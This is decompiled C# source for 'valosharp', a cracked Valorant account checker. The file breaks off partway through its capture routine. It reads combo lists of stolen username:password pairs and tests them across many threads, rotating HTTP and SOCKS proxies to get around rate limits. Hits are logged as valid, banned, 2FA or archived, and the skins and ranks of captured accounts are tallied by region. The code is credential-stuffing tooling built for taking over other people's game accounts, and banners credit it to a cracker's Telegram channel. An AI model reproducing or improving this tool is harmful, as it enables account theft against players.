﻿using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Colorful;
using Leaf.xNet;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;

namespace Valorant
{
	// Token: 0x02000004 RID: 4
	internal class CheckerHelper
	{
		// Token: 0x06000011 RID: 17 RVA: 0x0000288C File Offset: 0x00000A8C
		public static void LoadCombos(string fileName)
		{
			using (FileStream fileStream = File.Open(fileName, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
			{
				using (BufferedStream bufferedStream = new BufferedStream(fileStream))
				{
					using (StreamReader streamReader = new StreamReader(bufferedStream))
					{
						while (streamReader.ReadLine() != null)
						{
							CheckerHelper.total++;
						}
					}
				}
			}
		}

		// Token: 0x06000012 RID: 18 RVA: 0x00002910 File Offset: 0x00000B10
		public static void LoadProxies(string fileName)
		{
			using (FileStream fileStream = File.Open(fileName, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
			{
				using (BufferedStream bufferedStream = new BufferedStream(fileStream))
				{
					using (StreamReader streamReader = new StreamReader(bufferedStream))
					{
						while (streamReader.ReadLine() != null)
						{
							CheckerHelper.proxytotal++;
						}
					}
				}
			}
		}

		// Token: 0x06000013 RID: 19 RVA: 0x00002328 File Offset: 0x00000528
		public static void smethod_0()
		{
			for (;;)
			{
				CheckerHelper.seconds_gone++;
				Thread.Sleep(1000);
			}
		}

		// Token: 0x06000014 RID: 20 RVA: 0x00002994 File Offset: 0x00000B94
		public static void Checker()
		{
			Colorful.Console.Clear();
			Colorful.Console.Title = "valosharp ~ Menu - Full cracked by Cabbo | Telegram: @cabboshiba";
			Colorful.Console.Write("\n");
			Colorful.Console.Write("                    ██▒   █▓ ▄▄▄       ██▓     ▒█████    ██████  ██░ ██  ▄▄▄       ██▀███   ██▓███  \n", Color.Red);
			Colorful.Console.Write("                   ▓██░   █▒▒████▄    ▓██▒    ▒██▒  ██▒▒██    ▒ ▓██░ ██▒▒████▄    ▓██ ▒ ██▒▓██░  ██▒\n", Color.Red);
			Colorful.Console.Write("                    ▓██  █▒░▒██  ▀█▄  ▒██░    ▒██░  ██▒░ ▓██▄   ▒██▀▀██░▒██  ▀█▄  ▓██ ░▄█ ▒▓██░ ██▓▒\n", Color.Red);
			Colorful.Console.Write("                     ▒██ █░░░██▄▄▄▄██ ▒██░    ▒██   ██░  ▒   ██▒░▓█ ░██ ░██▄▄▄▄██ ▒██▀▀█▄  ▒██▄█▓▒ ▒\n", Color.Red);
			Colorful.Console.Write("                      ▒▀█░   ▓█   ▓██▒░██████▒░ ████▓▒░▒██████▒▒░▓█▒░██▓ ▓█   ▓██▒░██▓ ▒██▒▒██▒ ░  ░\n", Color.Red);
			Colorful.Console.Write("                      ░ ▐░   ▒▒   ▓▒█░░ ▒░▓  ░░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒ ▒▒   ▓▒█░░ ▒▓ ░▒▓░▒▓▒░ ░  ░\n", Color.Red);
			Colorful.Console.Write("                      ░ ▐░   ▒▒   ▓▒█░░ ▒░▓  ░░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒ ▒▒   ▓▒█░░ ▒▓ ░▒▓░▒▓▒░ ░  ░\n", Color.Red);
			Colorful.Console.Write("                      ░ ░░    ▒   ▒▒ ░░ ░ ▒  ░  ░ ▒ ▒░ ░ ░▒  ░ ░ ▒ ░▒░ ░  ▒   ▒▒ ░  ░▒ ░ ▒░░▒ ░     \n", Color.Red);
			Colorful.Console.Write("                        ░░    ░   ▒     ░ ░   ░ ░ ░ ▒  ░  ░  ░   ░  ░░ ░  ░   ▒     ░░   ░ ░░       \n", Color.Red);
			Colorful.Console.Write("                        ░░    ░   ▒     ░ ░   ░ ░ ░ ▒  ░  ░  ░   ░  ░░ ░  ░   ▒     ░░   ░ ░░       \n", Color.Red);
			Colorful.Console.Write("                         ░        ░  ░    ░  ░    ░ ░        ░   ░  ░  ░      ░  ░   ░              \n", Color.Red);
			Colorful.Console.Write("                        ░                                                                           \n", Color.Red);
			Colorful.Console.Write("\n                                                   t.me/valosharp", Color.Purple);
			Colorful.Console.Write("\n");
			Colorful.Console.Write("\n");
			Colorful.Console.Write("\n");
			CheckerHelper.log_prefix();
			Colorful.Console.WriteLine("FULL CRACKED BY CABBO");
			Colorful.Console.WriteLine("FULL CRACKED BY CABBO");
			Colorful.Console.WriteLine("FULL CRACKED BY CABBO");
			Colorful.Console.Write("Enter threads: ", Color.White);
			try
			{
				CheckerHelper.threads = int.Parse(Colorful.Console.ReadLine());
				goto IL_183;
			}
			catch
			{
				CheckerHelper.threads = 100;
				goto IL_183;
			}
			IL_147:
			if (CheckerHelper.proxytype == "1" || CheckerHelper.proxytype == "2")
			{
				goto IL_214;
			}
			CheckerHelper.log_prefix();
			Colorful.Console.Write("Please enter a valid proxy type: ", Color.White);
			IL_183:
			CheckerHelper.log_prefix();
			Colorful.Console.Write("\n".ToString());
			CheckerHelper.log_prefix();
			Colorful.Console.WriteLine("HTTP/S [0]: ", Color.White);
			CheckerHelper.log_prefix();
			Colorful.Console.WriteLine("SOCKS4 [1]: ", Color.White);
			CheckerHelper.log_prefix();
			Colorful.Console.WriteLine("SOCKS5 [2]: ", Color.White);
			CheckerHelper.log_prefix();
			Colorful.Console.Write("Enter proxy type: ", Color.White);
			CheckerHelper.proxytype = Colorful.Console.ReadLine();
			CheckerHelper.proxytype = CheckerHelper.proxytype.ToUpper();
			if (!(CheckerHelper.proxytype == "0"))
			{
				goto IL_147;
			}
			IL_214:
			Task.Factory.StartNew(delegate()
			{
				CheckerHelper.UpdateTitle();
			});
			Task.Factory.StartNew(delegate()
			{
				CheckerHelper.smethod_0();
			});
			CheckerHelper.CreateFolders();
			OpenFileDialog openFileDialog = new OpenFileDialog();
			string fileName;
			do
			{
				CheckerHelper.log_prefix();
				Colorful.Console.WriteLine("Please select your combos", Color.White);
				Thread.Sleep(100);
				openFileDialog.Title = "Combolist";
				openFileDialog.DefaultExt = "txt";
				openFileDialog.Filter = "Text files|*.txt";
				openFileDialog.RestoreDirectory = true;
				openFileDialog.ShowDialog();
				fileName = openFileDialog.FileName;
				CheckerHelper.combo_list_filename = fileName;
			}
			while (!File.Exists(fileName));
			CheckerHelper.accounts = new List<string>(File.ReadAllLines(fileName));
			CheckerHelper.LoadCombos(fileName);
			CheckerHelper.log_prefix();
			Colorful.Console.Write(string.Format("Loaded [{0}] combos\n", CheckerHelper.total), Color.White);
			if (CheckerHelper.proxytype != "NONE")
			{
				string fileName2;
				do
				{
					CheckerHelper.log_prefix();
					Colorful.Console.WriteLine("Please select your proxies", Color.White);
					Thread.Sleep(100);
					openFileDialog.Title = "Proxy";
					openFileDialog.DefaultExt = "txt";
					openFileDialog.Filter = "Text files|*.txt";
					openFileDialog.RestoreDirectory = true;
					openFileDialog.ShowDialog();
					fileName2 = openFileDialog.FileName;
					CheckerHelper.proxy_list_filename = fileName2;
				}
				while (!File.Exists(fileName2));
				CheckerHelper.proxies = new List<string>(File.ReadAllLines(fileName2));
				CheckerHelper.LoadProxies(fileName2);
				CheckerHelper.log_prefix();
				Colorful.Console.Write(string.Format("Loaded [{0}] proxies\n", CheckerHelper.proxytotal), Color.White);
			}
			CheckerHelper.log_prefix();
			Colorful.Console.Write("Loading api data\n", Color.White);
			Task[] array = new Task[1];
			array[0] = Task.Factory.StartNew(delegate()
			{
				CheckerHelper.load_api_data();
			});
			Task.WaitAll(array);
			CheckerHelper.log_prefix();
			Colorful.Console.Write("Loaded api data\n", Color.White);
			for (int i = 1; i <= CheckerHelper.threads; i++)
			{
				new Thread(new ThreadStart(CheckerHelper.Check)).Start();
			}
			Task.Factory.StartNew(delegate()
			{
				CheckerHelper.CLI();
			});
			Colorful.Console.ReadLine();
			Environment.Exit(0);
		}

		// Token: 0x06000015 RID: 21 RVA: 0x00002E24 File Offset: 0x00001024
		public static void CLI()
		{
			Colorful.Console.Clear();
			for (;;)
			{
				for (int i = 0; i < 100; i++)
				{
					Colorful.Console.SetCursorPosition(0, 0);
					Colorful.Console.Write("\n");
					Colorful.Console.Write("                    ██▒   █▓ ▄▄▄       ██▓     ▒█████    ██████  ██░ ██  ▄▄▄       ██▀███   ██▓███  \n", Color.Red);
					Colorful.Console.Write("                   ▓██░   █▒▒████▄    ▓██▒    ▒██▒  ██▒▒██    ▒ ▓██░ ██▒▒████▄    ▓██ ▒ ██▒▓██░  ██▒\n", Color.Red);
					Colorful.Console.Write("                    ▓██  █▒░▒██  ▀█▄  ▒██░    ▒██░  ██▒░ ▓██▄   ▒██▀▀██░▒██  ▀█▄  ▓██ ░▄█ ▒▓██░ ██▓▒\n", Color.Red);
					Colorful.Console.Write("                     ▒██ █░░░██▄▄▄▄██ ▒██░    ▒██   ██░  ▒   ██▒░▓█ ░██ ░██▄▄▄▄██ ▒██▀▀█▄  ▒██▄█▓▒ ▒\n", Color.Red);
					Colorful.Console.Write("                      ▒▀█░   ▓█   ▓██▒░██████▒░ ████▓▒░▒██████▒▒░▓█▒░██▓ ▓█   ▓██▒░██▓ ▒██▒▒██▒ ░  ░\n", Color.Red);
					Colorful.Console.Write("                      ░ ▐░   ▒▒   ▓▒█░░ ▒░▓  ░░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒ ▒▒   ▓▒█░░ ▒▓ ░▒▓░▒▓▒░ ░  ░\n", Color.Red);
					Colorful.Console.Write("                      ░ ▐░   ▒▒   ▓▒█░░ ▒░▓  ░░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒ ▒▒   ▓▒█░░ ▒▓ ░▒▓░▒▓▒░ ░  ░\n", Color.Red);
					Colorful.Console.Write("                      ░ ░░    ▒   ▒▒ ░░ ░ ▒  ░  ░ ▒ ▒░ ░ ░▒  ░ ░ ▒ ░▒░ ░  ▒   ▒▒ ░  ░▒ ░ ▒░░▒ ░     \n", Color.Red);
					Colorful.Console.Write("                        ░░    ░   ▒     ░ ░   ░ ░ ░ ▒  ░  ░  ░   ░  ░░ ░  ░   ▒     ░░   ░ ░░       \n", Color.Red);
					Colorful.Console.Write("                        ░░    ░   ▒     ░ ░   ░ ░ ░ ▒  ░  ░  ░   ░  ░░ ░  ░   ▒     ░░   ░ ░░       \n", Color.Red);
					Colorful.Console.Write("                         ░        ░  ░    ░  ░    ░ ░        ░   ░  ░  ░      ░  ░   ░              \n", Color.Red);
					Colorful.Console.Write("                        ░                                                                           \n", Color.Red);
					Colorful.Console.Write("\n                                                   t.me/valosharp", Color.Purple);
					Colorful.Console.Write("\n");
					Colorful.Console.Write("\n");
					Colorful.Console.Write("\n");
					CheckerHelper.log_prefix();
					Colorful.Console.WriteLine(string.Format("Combos loaded: {0}", CheckerHelper.total));
					CheckerHelper.log_prefix();
					Colorful.Console.WriteLine(string.Format("Proxies loaded: {0}", CheckerHelper.proxytotal));
					CheckerHelper.log_prefix();
					Colorful.Console.WriteLine(string.Format("Threads: {0}", CheckerHelper.threads));
					CheckerHelper.log_prefix();
					Colorful.Console.WriteLine("Selected combo file: " + CheckerHelper.combo_list_filename);
					CheckerHelper.log_prefix();
					Colorful.Console.WriteLine("Selected proxy file: " + CheckerHelper.proxy_list_filename);
					CheckerHelper.log_prefix();
					Colorful.Console.WriteLine(string.Format("CPM: {0}", CheckerHelper.CPM * 60 / CheckerHelper.seconds_gone));
					CheckerHelper.log_prefix();
					Colorful.Console.WriteLine("");
					CheckerHelper.log_prefix();
					Colorful.Console.WriteLine(string.Format("Checked: {0}", CheckerHelper.check + CheckerHelper.invalid_accounts.Count + CheckerHelper.banned_accounts.Count + CheckerHelper.archived_accounts.Count + CheckerHelper.multifactor_accounts.Count));
					CheckerHelper.log_prefix();
					Colorful.Console.WriteLine(string.Format("Captured: {0}", CheckerHelper.check));
					CheckerHelper.log_prefix();
					Colorful.Console.WriteLine(string.Format("Hits: {0}", CheckerHelper.valid_accounts.Count));
					CheckerHelper.log_prefix();
					Colorful.Console.WriteLine(string.Format("Invalid: {0}", CheckerHelper.invalid_accounts.Count));
					CheckerHelper.log_prefix();
					Colorful.Console.WriteLine(string.Format("Retries: {0}", CheckerHelper.retries));
					CheckerHelper.log_prefix();
					Colorful.Console.WriteLine(string.Format("Ratelimits: {0}", CheckerHelper.ratelimits));
					CheckerHelper.log_prefix();
					Colorful.Console.WriteLine("");
					CheckerHelper.log_prefix();
					Colorful.Console.WriteLine(string.Format("Archived accounts: {0}", CheckerHelper.archived_accounts.Count));
					CheckerHelper.log_prefix();
					Colorful.Console.WriteLine(string.Format("2FA: {0}", CheckerHelper.multifactor_accounts.Count));
					CheckerHelper.log_prefix();
					Colorful.Console.WriteLine(string.Format("Banned: {0}", CheckerHelper.banned_accounts.Count));
					CheckerHelper.log_prefix();
					Colorful.Console.WriteLine();
					CheckerHelper.log_prefix();
					Colorful.Console.WriteLine("==============================================================");
					CheckerHelper.log_prefix();
					Colorful.Console.WriteLine("Skins        >>    EU        |   NA       |   AP       |   KR");
					foreach (KeyValuePair<string, Dictionary<string, int>> keyValuePair in CheckerHelper.filter_accounts_skins)
					{
						string text = "";
						int length = keyValuePair.Key.Length;
						if (length == 1)
						{
							text = "[" + keyValuePair.Key + "]      ";
						}
						else if (length == 2)
						{
							text = "[" + keyValuePair.Key + "]     ";
						}
						else if (length == 3)
						{
							text = "[" + keyValuePair.Key + "]    ";
						}
						else if (length == 4)
						{
							text = "[" + keyValuePair.Key + "]   ";
						}
						else if (length == 5)
						{
							text = "[" + keyValuePair.Key + "]  ";
						}
						else if (length == 6)
						{
							text = "[" + keyValuePair.Key + "] ";
						}
						else if (length == 7)
						{
							text = "[" + keyValuePair.Key + "]";
						}
						string text2;
						if (CheckerHelper.filter_accounts_skins[keyValuePair.Key].ContainsKey("eu"))
						{
							text2 = string.Format("{0}", CheckerHelper.filter_accounts_skins[keyValuePair.Key]["eu"]);
						}
						else
						{
							text2 = "0";
						}
						int length2 = text2.Length;
						if (length2 == 1)
						{
							text2 += "        ";
						}
						else if (length2 == 2)
						{
							text2 += "       ";
						}
						else if (length2 == 3)
						{
							text2 += "      ";
						}
						else if (length2 == 4)
						{
							text2 += "     ";
						}
						else if (length2 == 5)
						{
							text2 += "    ";
						}
						string text3;
						if (!CheckerHelper.filter_accounts_skins[keyValuePair.Key].ContainsKey("na"))
						{
							text3 = "0";
						}
						else
						{
							text3 = string.Format("{0}", CheckerHelper.filter_accounts_skins[keyValuePair.Key]["na"]);
						}
						int length3 = text3.Length;
						if (length3 == 1)
						{
							text3 += "        ";
						}
						else if (length3 == 2)
						{
							text3 += "       ";
						}
						else if (length3 == 3)
						{
							text3 += "      ";
						}
						else if (length3 == 4)
						{
							text3 += "     ";
						}
						else if (length3 == 5)
						{
							text3 += "    ";
						}
						string text4;
						if (CheckerHelper.filter_accounts_skins[keyValuePair.Key].ContainsKey("ap"))
						{
							text4 = string.Format("{0}", CheckerHelper.filter_accounts_skins[keyValuePair.Key]["ap"]);
						}
						else
						{
							text4 = "0";
						}
						int length4 = text4.Length;
						if (length4 == 1)
						{
							text4 += "        ";
						}
						else if (length4 == 2)
						{
							text4 += "       ";
						}
						else if (length4 == 3)
						{
							text4 += "      ";
						}
						else if (length4 == 4)
						{
							text4 += "     ";
						}
						else if (length4 == 5)
						{
							text4 += "    ";
						}
						string text5;
						if (!CheckerHelper.filter_accounts_skins[keyValuePair.Key].ContainsKey("kr"))
						{
							text5 = "0";
						}
						else
						{
							text5 = string.Format("{0}", CheckerHelper.filter_accounts_skins[keyValuePair.Key]["kr"]);
						}
						int length5 = text5.Length;
						if (length5 == 1)
						{
							text5 += "        ";
						}
						else if (length5 == 2)
						{
							text5 += "       ";
						}
						else if (length5 == 3)
						{
							text5 += "      ";
						}
						else if (length5 == 4)
						{
							text5 += "     ";
						}
						else if (length5 == 5)
						{
							text5 += "    ";
						}
						CheckerHelper.log_prefix();
						Colorful.Console.WriteLine(string.Concat(new string[]
						{
							text,
							"    >>    ",
							text2,
							" |   ",
							text3,
							"|   ",
							text4,
							"|   ",
							text5
						}));
					}
					CheckerHelper.log_prefix();
					Colorful.Console.WriteLine("==============================================================");
					if (CheckerHelper.capture_rank)
					{
						CheckerHelper.log_prefix();
						Colorful.Console.WriteLine("Ranks        >>    EU        |   NA       |   AP       |   KR");
						foreach (KeyValuePair<string, Dictionary<string, Dictionary<string, int>>> keyValuePair2 in CheckerHelper.filter_accounts_ranks)
						{
							string text6 = "";
							int length6 = keyValuePair2.Key.Length;
							if (length6 == 4)
							{
								text6 = "[" + keyValuePair2.Key + "]    ";
							}
							else if (length6 == 5)
							{
								text6 = "[" + keyValuePair2.Key + "]   ";
							}
							else if (length6 == 6)
							{
								text6 = "[" + keyValuePair2.Key + "]  ";
							}
							else if (length6 == 7)
							{
								text6 = "[" + keyValuePair2.Key + "] ";
							}
							else if (length6 == 8)
							{
								text6 = "[" + keyValuePair2.Key + "]";
							}
							string text7;
							if (CheckerHelper.filter_accounts_ranks[keyValuePair2.Key].ContainsKey("eu"))
							{
								text7 = string.Format("{0}/{1}", CheckerHelper.filter_accounts_ranks[keyValuePair2.Key]["eu"]["verified"], CheckerHelper.filter_accounts_ranks[keyValuePair2.Key]["eu"]["unverified"]);
							}
							else
							{
								text7 = "0/0";
							}
							int length7 = text7.Length;
							if (length7 == 3)
							{
								text7 += "      ";
							}
							else if (length7 == 4)
							{
								text7 += "     ";
							}
							else if (length7 == 5)
							{
								text7 += "    ";
							}
							else if (length7 == 6)
							{
								text7 += "   ";
							}
							else if (length7 == 7)
							{
								text7 += "  ";
							}
							else if (length7 == 8)
							{
								text7 += " ";
							}
							else if (length7 == 9)
							{
								text7 = (text7 ?? "");
							}
							string text8;
							if (!CheckerHelper.filter_accounts_ranks[keyValuePair2.Key].ContainsKey("na"))
							{
								text8 = "0/0";
							}
							else
							{
								text8 = string.Format("{0}/{1}", CheckerHelper.filter_accounts_ranks[keyValuePair2.Key]["na"]["verified"], CheckerHelper.filter_accounts_ranks[keyValuePair2.Key]["na"]["unverified"]);
							}
							int length8 = text8.Length;
							if (length8 == 3)
							{
								text8 += "      ";
							}
							else if (length8 == 4)
							{
								text8 += "     ";
							}
							else if (length8 == 5)
							{
								text8 += "    ";
							}
							else if (length8 == 6)
							{
								text8 += "   ";
							}
							else if (length8 == 7)
							{
								text8 += "  ";
							}
							else if (length8 == 8)
							{
								text8 += " ";
							}
							else if (length8 == 9)
							{
								text8 = (text8 ?? "");
							}
							string text9;
							if (!CheckerHelper.filter_accounts_ranks[keyValuePair2.Key].ContainsKey("ap"))
							{
								text9 = "0/0";
							}
							else
							{
								text9 = string.Format("{0}/{1}", CheckerHelper.filter_accounts_ranks[keyValuePair2.Key]["ap"]["verified"], CheckerHelper.filter_accounts_ranks[keyValuePair2.Key]["ap"]["unverified"]);
							}
							int length9 = text9.Length;
							if (length9 == 3)
							{
								text9 += "      ";
							}
							else if (length9 == 4)
							{
								text9 += "     ";
							}
							else if (length9 == 5)
							{
								text9 += "    ";
							}
							else if (length9 == 6)
							{
								text9 += "   ";
							}
							else if (length9 == 7)
							{
								text9 += "  ";
							}
							else if (length9 == 8)
							{
								text9 += " ";
							}
							else if (length9 == 9)
							{
								text9 = (text9 ?? "");
							}
							string text10;
							if (!CheckerHelper.filter_accounts_ranks[keyValuePair2.Key].ContainsKey("kr"))
							{
								text10 = "0/0";
							}
							else
							{
								text10 = string.Format("{0}/{1}", CheckerHelper.filter_accounts_ranks[keyValuePair2.Key]["kr"]["verified"], CheckerHelper.filter_accounts_ranks[keyValuePair2.Key]["kr"]["unverified"]);
							}
							int length10 = text10.Length;
							if (length10 == 3)
							{
								text10 += "      ";
							}
							else if (length10 == 4)
							{
								text10 += "     ";
							}
							else if (length10 == 5)
							{
								text10 += "    ";
							}
							else if (length10 == 6)
							{
								text10 += "   ";
							}
							else if (length10 == 7)
							{
								text10 += "  ";
							}
							else if (length10 == 8)
							{
								text10 += " ";
							}
							else if (length10 == 9)
							{
								text10 = (text10 ?? "");
							}
							CheckerHelper.log_prefix();
							Colorful.Console.WriteLine(string.Concat(new string[]
							{
								text6,
								"   >>    ",
								text7,
								" |   ",
								text8,
								"|   ",
								text9,
								"|   ",
								text10
							}));
						}
						Thread.Sleep(500);
					}
				}
			}
		}

		// Token: 0x06000016 RID: 22 RVA: 0x00003C18 File Offset: 0x00001E18
		public static void UpdateTitle()
		{
			for (;;)
			{
				CheckerHelper.CPM = CheckerHelper.CPM_aux;
				Colorful.Console.Title = string.Format("valosharp ~ Checker | {0}/{1} | VALIDS: {2} | INVALIDS: {3} | BANNED: {4} | ARCHIVED: {5} | 2FA: {6} | CPM: {7}", new object[]
				{
					CheckerHelper.check + CheckerHelper.invalid_accounts.Count + CheckerHelper.banned_accounts.Count + CheckerHelper.archived_accounts.Count + CheckerHelper.multifactor_accounts.Count,
					CheckerHelper.accounts.Count,
					CheckerHelper.valid_accounts.Count,
					CheckerHelper.invalid_accounts.Count,
					CheckerHelper.banned_accounts.Count,
					CheckerHelper.archived_accounts.Count,
					CheckerHelper.multifactor_accounts.Count,
					CheckerHelper.CPM * 60 / CheckerHelper.seconds_gone
				});
				Thread.Sleep(100);
			}
		}

		// Token: 0x06000017 RID: 23 RVA: 0x00003D0C File Offset: 0x00001F0C
		public static void log_prefix()
		{
			Colorful.Console.Write("[", Color.White);
			Colorful.Console.Write("valosharp", Color.Red);
			Colorful.Console.Write("/", Color.White);
			Colorful.Console.Write(DateTime.Now.ToString("HH:MM:ss"), Color.Yellow);
			Colorful.Console.Write("] ", Color.White);
		}

		// Token: 0x06000018 RID: 24 RVA: 0x00003D74 File Offset: 0x00001F74
		public static HttpResponse HandleRequest(HttpRequest httpClient, HttpMethod method, Uri url, StringContent data = null)
		{
			int num = new Random().Next(CheckerHelper.proxies.Count - 1);
			HttpResponse result;
			try
			{
				HttpResponse httpResponse = httpClient.Raw(method, url, data);
				HttpResponse httpResponse2 = httpResponse;
				if (!httpResponse.ToString().Contains("rate_limited"))
				{
					httpResponse2 = httpResponse;
				}
				else if (!httpResponse.ToString().Contains("multifactor"))
				{
					CheckerHelper.ratelimits++;
					bool flag = false;
					while (!flag)
					{
						num++;
						if (CheckerHelper.proxytype == "0")
						{
							httpClient.Proxy = HttpProxyClient.Parse(CheckerHelper.proxies[num]);
							httpClient.Proxy.ConnectTimeout = 5000;
						}
						if (CheckerHelper.proxytype == "1")
						{
							httpClient.Proxy = Socks4ProxyClient.Parse(CheckerHelper.proxies[num]);
							httpClient.Proxy.ConnectTimeout = 5000;
						}
						if (CheckerHelper.proxytype == "2")
						{
							httpClient.Proxy = Socks5ProxyClient.Parse(CheckerHelper.proxies[num]);
							httpClient.Proxy.ConnectTimeout = 5000;
						}
						HttpResponse httpResponse3 = httpClient.Raw(method, url, data);
						if (httpResponse.ToString().Contains("rate_limited"))
						{
							if (httpResponse.ToString().Contains("multifactor"))
							{
								flag = true;
								httpResponse2 = httpResponse3;
							}
						}
						else
						{
							flag = true;
							httpResponse2 = httpResponse3;
						}
					}
				}
				else
				{
					httpResponse2 = httpResponse;
				}
				result = httpResponse2;
			}
			catch
			{
				CheckerHelper.retries++;
				num++;
				if (CheckerHelper.proxytype == "0")
				{
					httpClient.Proxy = HttpProxyClient.Parse(CheckerHelper.proxies[num]);
					httpClient.Proxy.ConnectTimeout = CheckerHelper.proxy_timeout;
				}
				if (CheckerHelper.proxytype == "1")
				{
					httpClient.Proxy = Socks4ProxyClient.Parse(CheckerHelper.proxies[num]);
					httpClient.Proxy.ConnectTimeout = CheckerHelper.proxy_timeout;
				}
				if (CheckerHelper.proxytype == "2")
				{
					httpClient.Proxy = Socks5ProxyClient.Parse(CheckerHelper.proxies[num]);
					httpClient.Proxy.ConnectTimeout = CheckerHelper.proxy_timeout;
				}
				result = CheckerHelper.HandleRequest(httpClient, method, url, data);
			}
			return result;
		}

		// Token: 0x06000019 RID: 25 RVA: 0x00003FC0 File Offset: 0x000021C0
		public static Dictionary<string, string> account_info_to_object(JObject user_info_object, string combo)
		{
			Dictionary<string, string> dictionary = new Dictionary<string, string>();
			dictionary.Add("Country", (string)user_info_object["country"]);
			try
			{
				dictionary.Add("Ingame name", (string)user_info_object["acct"]["game_name"]);
			}
			catch
			{
			}
			List<string> list = new List<string>();
			list.Add("AC_SCRIPTING_PERMANENT");
			list.Add("PERMANENT_BAN");
			list.Add("ares");
			list.Add("PERMA_BAN");
			list.Add("Player banned");
			try
			{
				string text = "False";
				foreach (string value in list)
				{
					if (user_info_object.ToString(Formatting.None, Array.Empty<JsonConverter>()).Contains(value))
					{
						text = "True";
						if (!CheckerHelper.banned_accounts.Any(new Func<string, bool>(combo.Contains)))
						{
							CheckerHelper.banned_accounts.Add(combo);
							break;
						}
						break;
					}
				}
				dictionary.Add("Banned", text.ToString());
			}
			catch
			{
			}
			return dictionary;
		}

		// Token: 0x0600001A RID: 26 RVA: 0x00004108 File Offset: 0x00002308
		public static string translate_cpid(string cpid)
		{
			string result = cpid;
			if (cpid != null)
			{
				foreach (KeyValuePair<string, string> keyValuePair in new Dictionary<string, string>
				{
					{
						"BR1",
						"BR"
					},
					{
						"EUN1",
						"EUN"
					},
					{
						"EUW1",
						"EUW"
					},
					{
						"JP1",
						"JP"
					},
					{
						"KR",
						"KR"
					},
					{
						"LA1",
						"LAN"
					},
					{
						"LA2",
						"LAS"
					},
					{
						"NA1",
						"NA"
					},
					{
						"OC1",
						"OCE"
					},
					{
						"PBE1",
						"PBE"
					},
					{
						"RU",
						"RU"
					},
					{
						"TR1",
						"TR"
					}
				})
				{
					if (keyValuePair.Key == cpid.ToUpper())
					{
						result = keyValuePair.Value;
						break;
					}
				}
			}
			return result;
		}

		// Token: 0x0600001B RID: 27 RVA: 0x0000423C File Offset: 0x0000243C
		public static string translate_country(string country)
		{
			Dictionary<string, string> dictionary = new Dictionary<string, string>();
			string result = country;
			dictionary.Add("DEU", "eu");
			dictionary.Add("BR", "na");
			dictionary.Add("EUN", "eu");
			dictionary.Add("EUW", "eu");
			dictionary.Add("JP", "ap");
			dictionary.Add("LAN", "na");
			dictionary.Add("LAS", "na");
			dictionary.Add("NA", "na");
			dictionary.Add("OCE", "ap");
			dictionary.Add("RU", "eu");
			dictionary.Add("TR", "eu");
			dictionary.Add("ESP", "eu");
			dictionary.Add("SVK", "eu");
			dictionary.Add("TUR", "eu");
			dictionary.Add("USA", "na");
			dictionary.Add("ITA", "eu");
			dictionary.Add("FRA", "eu");
			dictionary.Add("BRA", "na");
			dictionary.Add("POL", "eu");
			foreach (KeyValuePair<string, string> keyValuePair in dictionary)
			{
				if (keyValuePair.Key == country.ToUpper())
				{
					result = keyValuePair.Value;
					break;
				}
			}
			return result;
		}

		// Token: 0x0600001C RID: 28 RVA: 0x000043D8 File Offset: 0x000025D8
		public static string add_data(string old_text, Dictionary<string, string> to_add)
		{
			string text = old_text;
			foreach (KeyValuePair<string, string> keyValuePair in to_add)
			{
				text = string.Concat(new string[]
				{
					text,
					"\n| ",
					keyValuePair.Key,
					": ",
					keyValuePair.Value
				});
			}
			return text;
		}

		// Token: 0x0600001D RID: 29 RVA: 0x00002341 File Offset: 0x00000541
		public static string account_info_object_to_string(Dictionary<string, string> account_info_object, string combo)
		{
			return CheckerHelper.add_data("User & Pass: " + combo, account_info_object);
		}

		// Token: 0x0600001E RID: 30 RVA: 0x00004458 File Offset: 0x00002658
		public static string convert_skin_id_to_display_name(string item_id)
		{
			string result = item_id;
			foreach (JToken jtoken in ((IEnumerable<JToken>)CheckerHelper.api_skins))
			{
				using (IEnumerator<JToken> enumerator2 = ((IEnumerable<JToken>)jtoken["levels"]).GetEnumerator())
				{
					if (enumerator2.MoveNext())
					{
						JToken jtoken2 = enumerator2.Current;
						if ((string)jtoken2["uuid"] == item_id)
						{
							result = (string)jtoken2["displayName"];
						}
					}
				}
			}
			return result;
		}

		// Token: 0x0600001F RID: 31 RVA: 0x00004500 File Offset: 0x00002700
		public static List<string> convert_entitlements_to_skins(JToken skins)
		{
			List<string> list = new List<string>
			{
				""
			};
			try
			{
				foreach (JToken jtoken in ((IEnumerable<JToken>)skins))
				{
					string text = CheckerHelper.convert_skin_id_to_display_name((string)jtoken["ItemID"]);
					if (text != null)
					{
						list.Add(text);
					}
				}
			}
			catch
			{
				Interlocked.Increment(ref CheckerHelper.err);
			}
			return list;
		}

		// Token: 0x06000020 RID: 32 RVA: 0x00004590 File Offset: 0x00002790
		public static void Capture(HttpRequest httpClient, string access_token, string[] combo)
		{
			bool flag = false;
			while (!flag)
			{
				using (HttpRequest httpRequest = new HttpRequest())
				{
					string text = combo[0] + ":" + combo[1];
					int index = new Random().Next(CheckerHelper.proxies.Count - 1);
					if (CheckerHelper.proxytype == "0")
					{
						httpRequest.Proxy = HttpProxyClient.Parse(CheckerHelper.proxies[index]);
						httpRequest.Proxy.ConnectTimeout = CheckerHelper.proxy_timeout;
					}
					if (CheckerHelper.proxytype == "1")
					{
						httpRequest.Proxy = Socks4ProxyClient.Parse(CheckerHelper.proxies[index]);
						httpRequest.Proxy.ConnectTimeout = CheckerHelper.proxy_timeout;
					}
					if (CheckerHelper.proxytype == "2")
					{
						httpRequest.Proxy = Socks5ProxyClient.Parse(CheckerHelper.proxies[index]);
						httpRequest.Proxy.ConnectTimeout = CheckerHelper.proxy_timeout;
					}
					httpRequest.IgnoreProtocolErrors = true;
					httpRequest.ConnectTimeout = CheckerHelper.proxy_timeout;
					httpRequest.AddHeader(HttpHeader.UserAgent, "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko");
					List<string> list = new List<string>();
